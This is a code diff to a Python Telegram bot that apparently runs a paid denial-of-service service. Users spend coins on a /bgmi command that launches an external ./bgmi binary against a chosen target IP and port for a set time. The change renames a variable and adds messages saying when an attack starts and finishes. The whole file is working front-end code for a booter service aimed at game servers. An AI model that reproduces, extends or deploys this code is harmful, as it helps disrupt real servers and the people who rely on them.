@@ -2,6 +2,7 @@ import telebot
 import os
 import json
 import subprocess
+import time
 
 # Load token securely from an environment variable
 TOKEN = os.getenv("BOT_TOKEN")  
@@ -108,7 +109,7 @@ def add_coins(message):
     else:
         bot.reply_to(message, "🚫 Only Admins can use this command.")
 
-# /bgmi Attack Command with Coin Deduction & Time Limit
+# /bgmi Attack Command with Coin Deduction, Start & Finish Messages
 @bot.message_handler(commands=['bgmi'])
 def handle_bgmi(message):
     user_id = str(message.chat.id)
@@ -117,13 +118,13 @@ def handle_bgmi(message):
         if len(command) == 4:
             target = command[1]
             port = int(command[2])
-            time = int(command[3])  # Time in seconds
+            attack_time = int(command[3])  # Time in seconds
 
-            if time > MAX_ATTACK_TIME:
+            if attack_time > MAX_ATTACK_TIME:
                 bot.reply_to(message, f"⏳ Max attack time is {MAX_ATTACK_TIME} seconds!")
                 return
 
-            required_coins = time * COIN_RATE  # Calculate required coins
+            required_coins = attack_time * COIN_RATE  # Calculate required coins
             balance = user_coins.get(user_id, 0)
 
             if balance < required_coins:
@@ -134,10 +135,19 @@ def handle_bgmi(message):
             user_coins[user_id] -= required_coins
             save_coins()
 
+            # Notify user that attack started
+            bot.reply_to(message, f"🚀 Attack started on {target} for {attack_time} seconds! 🔥\n💰 {required_coins} coins deducted.")
+
             # Execute the external ./bgmi script
             try:
-                subprocess.run(["./bgmi", target, str(port), str(time)], check=True)
-                bot.reply_to(message, f"🚀 Attack started on {target} for {time} seconds! 🔥\n💰 {required_coins} coins deducted.")
+                subprocess.run(["./bgmi", target, str(port), str(attack_time)], check=True)
+                
+                # Wait for attack duration
+                time.sleep(attack_time)
+
+                # Notify user that attack has finished
+                bot.send_message(user_id, f"✅ Attack on {target} has finished after {attack_time} seconds.")
+            
             except Exception as e:
                 bot.reply_to(message, f"⚠️ Error executing attack: {str(e)}")
         else:
